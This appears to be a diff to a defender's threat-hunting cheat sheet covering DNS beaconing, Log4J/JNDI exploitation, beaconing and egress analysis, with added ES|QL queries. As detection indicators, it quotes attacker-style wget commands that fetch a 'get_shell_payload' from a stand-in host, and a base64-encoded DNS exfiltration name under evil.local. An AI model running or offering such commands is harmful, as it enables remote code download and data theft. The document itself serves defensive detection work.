@@ -1,3 +1,10 @@
+# DNS Beaconing [T1071.004](https://attack.mitre.org/techniques/T1071/004/)
+1. Look for DNS traffic that contains encoded DNS question names like "dns.question.name	cm9vdEAxOTguNTEuMTAwLjI2LTg3NDU2dy1sc2xlZDEyLVNVU0UtNC4xMi4xNC05NC40MS1kZWZhdWx0ICMxIFNNUCBXZWQgT2N0IDMxIDEyOjI1OjA0IFVUQyAyMDE4ICgzMDkwOTAxKQo=.evil.local". Which decodes to DNS beacon. 
+
+
+# Find JNDI Exploitation/Log4J [T1190](https://attack.mitre.org/techniques/T1190/)
+1. Look for log traffic with ```wget http[:]//awk3hd9encccccA_diesla[:]8000/get_shell_payload``` and ```java log4j_execution.java wget http://awk3hd9encccccA_diesla:8000/get_shell_payload``` like attempts. It should contain Java within the command. 
+
 # Find SQL Injection [T1190](https://attack.mitre.org/techniques/T1190/)
 1. Look for ```'```, ```---```, ```#```, ```UNION```, ```WAITFOR DELAY```, and ```SLEEP()``` statements in web traffic. 
 
@@ -90,6 +97,15 @@
 1. Use ```zeek``` with the ```zeek-sniffpass``` package
 	- ```zeek-cut``` can be beneficial on the command line to pick specific fields
 2. Use Wireshark and examine packets. 
+3. Use ES|QL within Elastic with: 
+	- ```ES|QL 
+		from logs-*
+		| where network.bytes > 0 and destination.port > 0 and network.direction == "egress" and destination.port not in (80,443)
+		| stats network.bytes = sum(network.bytes) by destination.port, host.name
+		| keep host.name, destination.port, network.bytes
+		| rename host.name as Host, destination.port as Port
+		| sort network.bytes DESC
+		```
 
 # View GEO IP Information in Traffic [No TTP]
 1. Use ```zeek``` with the ```geoip-conn``` package. 
@@ -109,9 +125,27 @@
 1. Use ```tshark``` within the command line. 
 	- Command to use is ```"C:\Program Files\Wireshark\tshark.exe" -r pcap_file.pcap -Y "icmp" -T fields -e data```
 2. Use [Rita](https://github.com/activecm/rita) to find beaconing activity. 
+3. Use ES|QL within Elastic with: 
+	- ```ES|QL 
+		from logs-*
+		| where network.bytes > 0 and destination.port > 0 and network.direction == "egress" and destination.port not in (80,443)
+		| stats network.bytes = sum(network.bytes) by destination.port, host.name
+		| keep host.name, destination.port, network.bytes
+		| rename host.name as Host, destination.port as Port
+		| sort network.bytes DESC
+		```
 
 # Find Beaconing Activity [T1048](https://attack.mitre.org/techniques/T1048/003) [T1573](http://attack.mitre.org/techniques/T1573/)
 1. Use [Rita](https://github.com/activecm/rita) to find beaconing activity. 
+2. Use ES|QL within Elastic with: 
+	- ```ES|QL 
+		from logs-*
+		| where network.bytes > 0 and destination.port > 0 and network.direction == "egress" and destination.port not in (80,443)
+		| stats network.bytes = sum(network.bytes) by destination.port, host.name
+		| keep host.name, destination.port, network.bytes
+		| rename host.name as Host, destination.port as Port
+		| sort network.bytes DESC
+		```
 
 # Find VPN Connections [T1333](https://attack.mitre.org/techniques/T1133/)
 1. Use Event ID 6272 within windows security logs for external IP of user. 
